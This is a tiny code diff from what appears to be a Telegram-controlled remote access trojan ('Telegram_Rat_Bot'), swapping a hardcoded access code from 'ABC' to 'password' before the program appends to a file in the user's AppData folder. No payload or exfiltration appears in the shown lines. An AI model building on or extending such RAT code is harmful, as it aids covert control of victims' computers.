@@ -140,7 +140,7 @@ namespace Telegram_Rat_Bot
              
             if (step == -1 && message.Text != "Ввести код доступа")
             {
-                if (message.Text == "ABC")
+                if (message.Text == "password")
                 {
                     using (FileStream fstream = new FileStream($"C:/Users/{Environment.UserName}/AppData/Roaming/info.txt", FileMode.Append))
                     {
